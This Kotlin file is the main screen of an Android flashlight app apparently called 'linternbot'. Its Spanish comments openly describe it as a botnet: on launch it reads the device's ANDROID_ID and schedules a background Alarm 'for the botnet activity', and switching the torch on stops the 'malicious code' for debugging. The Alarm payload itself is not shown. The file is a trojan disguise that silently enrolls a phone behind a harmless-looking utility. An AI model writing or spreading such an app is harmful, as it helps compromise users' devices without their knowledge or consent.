package com.linternbot

import android.content.Context
import android.hardware.camera2.CameraManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.ActionBar
import androidx.appcompat.app.AppCompatActivity
import android.util.Log
import android.view.View.INVISIBLE
import android.view.View.VISIBLE
import android.widget.ImageView
import androidx.annotation.RequiresApi



var idAndroid = ""  // Variable global para almacenar el identificador unico del dispositivo android

class MainActivity : AppCompatActivity() {

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val actionBar: ActionBar? = supportActionBar
        actionBar?.hide()
        val button = findViewById<ImageView>(R.id.boton1)
        val button2 = findViewById<ImageView>(R.id.boton2)
        idAndroid =  Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )

        button2.visibility = INVISIBLE
        var alarm = Alarm()

        // Comienzo del trabajo en segundo plano para la actividad de la botnet
        alarm.setAlarm(this)


        // Cuando la linterna está encendida
        button.setOnClickListener {
            if(button.visibility.equals(VISIBLE)){
                button.visibility = INVISIBLE
                button2.visibility = VISIBLE

                val camManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val cameraId = camManager.cameraIdList[0] // usualmente la camara delantera esta en la posicion 0
                try {
                    camManager.setTorchMode(cameraId, true)

                    // Para de ejecutarse el codigo malicioso para debug
                    alarm.cancelAlarm(this)

                }
                catch (e: Exception){
                    print("Error al encontrar el flash")
                }
            }
        }

        button2.setOnClickListener { // LA LINTERNA ESTA APAGADA
            if (button2.visibility.equals(VISIBLE)) {
                button.visibility = VISIBLE
                button2.visibility = INVISIBLE

                val camManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val cameraId = camManager.cameraIdList[0]
                try {
                    camManager.setTorchMode(cameraId, false)
                }
                catch (e: Exception){
                    print("Error al encontrar el flash")
                }
            }
        }
    }
}
